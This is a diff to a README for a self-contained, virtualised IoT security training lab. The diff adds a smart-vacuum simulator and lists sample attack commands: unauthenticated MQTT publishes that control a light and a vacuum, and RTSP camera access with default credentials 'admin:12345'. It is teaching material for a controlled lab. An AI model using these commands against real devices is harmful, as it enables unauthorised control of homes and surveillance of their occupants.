@@ -2,7 +2,7 @@
 
 A self-contained, isolated IoT security testing environment designed for demonstrating common IoT vulnerabilities and attack paths in a controlled virtualised network.
 
-The lab uses intentionally vulnerable IoT services and simulated devices, including an RTSP camera, MQTT smart light, and BLE smart lock. Everything runs inside VMware and is isolated from real networks.
+The lab uses intentionally vulnerable IoT services and simulated devices, including an RTSP camera, MQTT smart light, MQTT smart Vacuum and BLE smart lock. Everything runs inside VMware and is isolated from real networks.
 
 _(NOTE: The lock simulator is not yet implimented)_
 
@@ -11,7 +11,7 @@ _(NOTE: The lock simulator is not yet implimented)_
 | VM | OS | IP | Purpose |
 |---|---|---|---|
 | **Attacker** | Kali Linux | `192.168.50.10` | Penetration testing and analysis |
-| **IoT Services** | Ubuntu Desktop 22.04 | `192.168.50.20` | RTSP camera, MQTT broker, Node-RED and smart-light simulator |
+| **IoT Services** | Ubuntu Desktop 22.04 | `192.168.50.20` | RTSP camera, MQTT broker, Node-RED, smart-light and smart-vacuum simulator |
 | **IoT Lock** | Debian 12 | `192.168.50.30` | Virtual BLE controllers and HackMeLock |
 
 All VMs communicate through the isolated VMware LAN Segment:
@@ -26,6 +26,7 @@ All VMs communicate through the isolated VMware LAN Segment:
           │                │                │
        Attacker       RTSP / MQTT       BLE Lock
         Tools         Smart Light       Simulator
+                       + Vacuum
 ```
 
 The lab network is intentionally isolated from the host's real LAN and the Internet.
@@ -50,8 +51,9 @@ Ubuntu Desktop hosts the main IoT services using Docker:
 - **Mosquitto** - deliberately insecure MQTT broker
 - **Node-RED** - smart-home dashboard
 - **Smart Light Simulator** - Python/Tkinter MQTT-controlled device
+- **Smart Vacuum Simulator** - Python MQTT based C2 link
 
-The camera feed and smart-light interface provide visible demonstrations of attacks against IoT services.
+The camera feed, smart-light and smart-vacuum interface provide visible demonstrations of attacks against IoT services.
 
 ### IoT Lock VM
 Debian hosts:
@@ -84,6 +86,7 @@ docker compose up -d
 
 python3 ~/iot-lab/smart_light.py &
 ffplay -rtsp_transport tcp rtsp://127.0.0.1:8554/cam
+python3 ~/iot-lab/smart_vacuum.py
 ```
 
 The Docker stack provides the RTSP and MQTT services, while the smart-light simulator provides a visible MQTT-controlled device.
@@ -115,7 +118,7 @@ Successful host discovery and service checks indicate that the lab is ready for 
 
 From the first sample attack, the successful attack commands are:
 
-Smart Light:
+### Smart Light:
 ```bash
 mosquitto_pub \
   -h 192.168.50.20 \
@@ -126,11 +129,47 @@ mosquitto_pub \
 
 _Note: the payload ('OFF') can be changed to turn the light on or change it's colour (either simple colours or hex codes)_
 
-Security Camera:
+### Security Camera:
 ```bash
 ffplay \
   rtsp://admin:12345@192.168.50.20:8554/cam
 ```
+
+### Smart Vacuum:
+
+#### Command:
+
+```bash
+mosquitto_pub \
+  -h 192.168.50.20 \
+  -t 'home/vacuum/command' \
+  -m 'STOP'
+```
+
+_(NOTE: Commands include: `START`, `STOP`, `PAUSE`, `RETURN_HOME`)_
+
+#### Control:
+
+```bash
+mosquitto_pub \
+  -h 192.168.50.20 \
+  -t 'home/vacuum/goto' \
+  -m '200,150'
+```
+
+_(NOTE: coord values must be between `x:0 - 660` and `y:0 - 440`)_
+
+#### Speed: 
+
+```bash
+mosquitto_pub \
+  -h 192.168.50.20 \
+  -t 'home/vacuum/speed' \
+  -m 'FAST'
+```
+
+_(NOTE: speeds include: `SLOW`, `NORMAL`, `FAST`)_
+
 
 ## Credentials
 
